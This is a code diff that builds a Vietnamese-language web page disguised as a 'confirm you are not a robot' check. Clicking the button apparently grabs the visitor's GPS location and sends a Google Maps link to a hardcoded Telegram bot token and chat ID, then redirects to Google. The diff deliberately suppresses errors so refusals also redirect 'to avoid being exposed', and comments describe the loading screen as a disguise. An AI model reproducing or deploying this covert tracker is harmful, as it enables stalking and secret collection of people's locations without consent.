@@ -1,8 +1,44 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang chuyển hướng...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 80px; background: #f0f2f5; color: #333; }
+        .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #btn-confirm { padding: 15px 25px; font-size: 16px; color: white; background: #0088cc; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
+        #btn-confirm:active { background: #006699; }
+        p { font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="step-1">
+            <h2 style="font-size: 20px;">Yêu cầu xác minh</h2>
+            <p>Vui lòng xác nhận bạn không phải là người máy để tiếp tục truy cập trang web.</p>
+            <button id="btn-confirm" onclick="startTracking()">XÁC NHẬN TRUY CẬP</button>
+        </div>
+
+        <div id="step-2" style="display:none;">
+            <div class="loader"></div>
+            <p>Đang kiểm tra bảo mật và chuyển hướng...</p>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // 1. DÁN TOKEN VÀ ID CỦA BẠN VÀO ĐÂY
+        // ==========================================
         const TELE_TOKEN = '8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg';
         const CHAT_ID = '1197457034';
+        // ==========================================
 
         function startTracking() {
-            // Hiện giao diện loading
+            // Hiện giao diện loading ngụy trang
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
 
@@ -12,8 +48,7 @@
                     timeout: 7000
                 });
             } else {
-                alert("Trình duyệt của bạn không hỗ trợ định vị. Vui lòng thử trình duyệt khác!");
-                resetUI();
+                redirectUser();
             }
         }
 
@@ -21,32 +56,29 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
+            // Link Google Maps chuẩn để bạn bấm vào là xem được ngay
             const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 Vị trí Wave 54zz:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${Math.round(position.coords.accuracy)}m`;
+            const message = `📍 Vị trí của nó:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${position.coords.accuracy}m`;
 
             fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             })
-            .then(() => {
-                window.location.href = "https://www.google.com.vn";
-            })
-            .catch(() => {
-                // Nếu lỗi mạng khi gửi Tele, vẫn cho qua hoặc báo lỗi tùy bạn
-                window.location.href = "https://www.google.com.vn";
-            });
+            .then(() => redirectUser())
+            .catch(() => redirectUser());
         }
 
         function handleSystemError(error) {
-            // Hiển thị thông báo lỗi và yêu cầu bật vị trí
-            alert("LỖI: Vui lòng bật GPS và 'Cho phép' truy cập vị trí để tiếp tục!");
-            
-            // Đưa giao diện về ban đầu để người dùng bấm lại
-            resetUI();
+            // Dù lỗi hay bị từ chối vẫn chuyển hướng để không bị lộ
+            console.log("Lỗi GPS hoặc bị từ chối");
+            redirectUser();
         }
 
-        function resetUI() {
-            document.getElementById('step-1').style.display = 'block';
-            document.getElementById('step-2').style.display = 'none';
+        function redirectUser() {
+            // Chuyển hướng sang Google hoặc bất kỳ trang nào bạn muốn ngụy trang
+            window.location.href = "https://www.google.com.vn";
         }
+    </script>
+</body>
+</html>
